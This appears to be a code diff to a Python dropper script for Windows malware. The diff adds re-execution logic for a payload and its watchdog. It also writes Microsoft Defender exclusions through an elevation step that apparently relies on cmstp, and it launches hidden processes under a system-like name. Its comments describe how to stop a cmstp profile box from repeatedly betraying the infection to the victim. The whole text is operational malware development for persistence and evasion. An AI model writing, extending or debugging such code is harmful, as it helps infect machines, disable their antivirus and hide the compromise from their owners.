@@ -51,8 +51,22 @@ EXE_PATH = os.path.join(PERSIST_DIR, EXE_NAME)
 # in the AppHost dir, share its exclusion, wake it when it is dead. work.py
 # stages+execs the pair in order: tung FIRST, watchdog SECOND.
 WD_URL = os.environ.get("WD_URL", "")
+# r140: the watchdog re-fire carries the NAME (WDXN) and no url — the name is
+# all the re-exec road needs, so it wins when the url is absent (same leaf-name
+# rule: nothing carrying a separator or a parent hop is accepted).
+WDXN_ENV = os.environ.get("WDXN", "")
+
+
+def _safe_name(name, fallback):
+    n = str(name or "").strip().strip('"')
+    if n and ".." not in n and "/" not in n and "\\" not in n:
+        return n
+    return fallback
+
+
 # r136: same rule — the watchdog lands under its own asset name.
-WD_NAME = _local_name(WD_URL, "Windows.Device.Runtime.Broker.exe")
+WD_NAME = _safe_name(WDXN_ENV,
+                     _local_name(WD_URL, "Windows.Device.Runtime.Broker.exe"))
 WD_PATH = os.path.join(PERSIST_DIR, WD_NAME)
 
 
@@ -950,6 +964,56 @@ def write_file(path, data, exe=EXE_NAME):
         return False
 
 
+# ---- r140: the re-fire gate -------------------------------------------------
+# dj field: the first exe opened, then the same cmstp profile box started
+# coming back with every beat. the watchdog cannot always SEE an elevated
+# carrier (a ProcessHandle query hands back an empty image path for a
+# higher-integrity process), so each 10s beat read "dead", re-ran this file,
+# and the LIFT ran again — a fresh random service profile every time, and the
+# profile box with it. a re-fire only has to re-EXEC the pair; the lift is a
+# one-time job.
+LIFT_MARK = os.path.join(PERSIST_DIR, "wcache.lift")
+
+
+def lift_landed():
+    """the lift already ran on this box: marker from a previous run, or the
+    AppHost dir is already a Defender exclusion path (which is exactly what
+    the lift exists to write)."""
+    try:
+        if os.path.isfile(LIFT_MARK):
+            return True
+    except Exception:
+        pass
+    try:
+        return bool(exclusion_landed())
+    except Exception:
+        return False
+
+
+def mark_lift():
+    try:
+        with open(LIFT_MARK, "wb") as fh:
+            fh.write(b"1")
+    except Exception:
+        pass
+
+
+def reexec_pair():
+    """r140: the whole job of a re-fire — both images up, nothing on screen.
+    the probe is work.py's own toolhelp walk: unlike a ProcessHandle query it
+    sees elevated images, so this road cannot loop on a false 'dead'. the jar's
+    own bare-spawn fallback has the same shape."""
+    targets = [(EXE_NAME, EXE_PATH)]
+    if WD_URL or WDXN_ENV:
+        targets.append((WD_NAME, WD_PATH))
+    for name, path in targets:
+        try:
+            if path and os.path.exists(path) and not proc_alive(name):
+                subprocess.Popen([path], creationflags=0x08000000)
+        except Exception:
+            pass
+
+
 def main():
     try:
         os.makedirs(PERSIST_DIR, exist_ok=True)
@@ -981,7 +1045,29 @@ def main():
     except Exception:
         pass
 
+    # r140: a watchdog re-fire lands here with everything already staged and
+    # the exclusion already written. exec the pair and leave — no cmstp on this
+    # road, so no profile is created and no box can be raised.
+    if lift_landed():
+        reexec_pair()
+        return
+
     set_defender_exclusions()
+
+    # the elevated stage execs the pair; if that happened (exclusion written or
+    # carrier up) the lift is DONE for this box and never runs again. otherwise
+    # leave the marker off — the next run retries the lift, same as before.
+    landed = False
+    try:
+        landed = exclusion_landed() or proc_alive(EXE_NAME)
+    except Exception:
+        pass
+    if landed:
+        mark_lift()
+    elif not is_elevated():
+        # an elevated run already exec'd the pair inline (_run_stage_now) —
+        # spawning again here would be a second copy of the same image
+        reexec_pair()
 
 
 main()
